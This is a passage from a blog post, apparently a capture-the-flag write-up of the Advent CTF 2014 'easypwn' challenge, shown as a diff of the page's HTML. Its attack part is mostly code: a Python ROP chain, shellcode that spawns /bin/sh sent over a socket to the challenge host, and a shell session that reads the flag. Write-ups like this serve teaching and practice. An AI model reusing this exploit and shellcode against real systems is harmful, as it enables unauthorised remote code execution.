+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>First, I use a <code>pop esi; ret</code> gadget to set the value of <code>esi</code> to a 48 bit value that contains: 0x3, 0x0. Then I return to the little gadget to set <code>eax</code> (and <code>es</code>) using those values. This results in <code>eax</code> being the correct number for the next syscall, read:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">ADDESP</span><span class="p">)</span>    <span class="c"># fix stack</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>            <span class="c"># stdin</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048000</span><span class="p">)</span>    <span class="c"># address of buffer</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>        <span class="c"># number of bytes to read</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;BBBB&quot;</span>      <span class="c"># dummy value</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048000</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This reads in <code>0x200</code> bytes from stdin to the start of the executable section of the binary. Finally, the ROP chain returns to the start of that buffer, which hopefully contains our shellcode! Finally, make sure that the payload is indeed 125 bytes long, else this entire house of cards falls down:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># payload length must be 125, because after read, the next</span>
+</span><span class='line'><span class="c"># syscall is mprotect; eax = 125</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">125</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Because I ran the executable locally via socat, I need to connect to the proper socket and send the payload. The same goes for the remote connection.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'><span class="c">#s.connect((&quot;localhost&quot;,28099))</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;pwnable.katsudon.org&quot;</span><span class="p">,</span><span class="mi">28099</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After finishing the ROP chain, the binary should now be awaiting further shellcode on stdin, so I&rsquo;d better send that over quickly!</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># http://www.shell-storm.org/shellcode/files/shellcode-851.php</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># the shell should have been spawned, so interact with it</span>
+</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
+</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
+</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The shellcode is sent over; the ROP chain will read it at <code>0x8048000</code>, return to it and execute <code>/bin/sh</code>. Then I pass the socket to a telnet client to interact with the spawned shell. This allowed me to read the flag!</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/adventctf<span class="nv">$ </span>python exploit_easy.py
+</span><span class='line'>pwn me:
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>easypwn<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>easypwn<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>easypwn<span class="o">)</span>
+</span><span class='line'>cat /home/easypwn/flag
+</span><span class='line'>ADCTF_175_345y_7o_cON7ROL_5Y5c4LL
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The flag was <code>ADCTF_175_345y_7o_cON7ROL_5Y5c4LL</code>.</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">barrebas</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2014-12-21T10:24:42+01:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2014</span></span> <span class='time'>10:24 am</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/binary/'>binary</a>, <a class='category' href='/blog/categories/ctf/'>ctf</a>, <a class='category' href='/blog/categories/exploitation/'>exploitation</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://barrebas.github.io/blog/2014/12/21/advent-ctf-easypwn/" data-via="" data-counturl="http://barrebas.github.io/blog/2014/12/21/advent-ctf-easypwn/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/12/17/adctf-2014-oh-my-scanf/" title="Previous Post: Advent CTF 2014 - Oh My Scanf">&laquo; Advent CTF 2014 - Oh My Scanf</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2014/12/21/advent-ctf-2014-rotate/" title="Next Post: Advent CTF 2014 - rotate">Advent CTF 2014 - rotate &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/12/24/advent-ctf-2014-bruteforce/">Advent CTF 2014 - Bruteforce</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/12/24/advent-ctf-2014-shellcodeme/">Advent CTF 2014 - Shellcodeme</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/12/21/advent-ctf-2014-rotate/">Advent CTF 2014 - Rotate</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/12/21/advent-ctf-easypwn/">Advent CTF 2014 - Easypwn</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/12/17/adctf-2014-oh-my-scanf/">Advent CTF 2014 - Oh My Scanf</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - barrebas -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'barrebas';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://barrebas.github.io/blog/2014/12/21/advent-ctf-easypwn/';
+        var disqus_url = 'http://barrebas.github.io/blog/2014/12/21/advent-ctf-easypwn/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
